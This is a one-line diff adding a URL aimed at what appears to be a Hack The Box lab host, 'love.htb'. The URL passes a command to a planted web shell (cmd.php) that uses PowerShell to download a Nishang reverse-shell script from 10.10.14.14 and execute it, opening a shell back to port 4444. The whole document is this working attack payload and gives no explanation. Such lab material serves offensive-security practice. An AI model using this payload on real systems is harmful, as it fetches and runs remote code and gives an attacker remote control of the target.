@@ -1,0 +1,1 @@
+http://love.htb/images/cmd.php?777=powershell%20iex%20(New-Object%20Net.WebClient).DownloadString(%27http://10.10.14.14:8000/nishang-rev.ps1%27);Invoke-PowerShellTcp%20-Reverse%20-IPAddress%2010.10.14.14%20-Port%204444
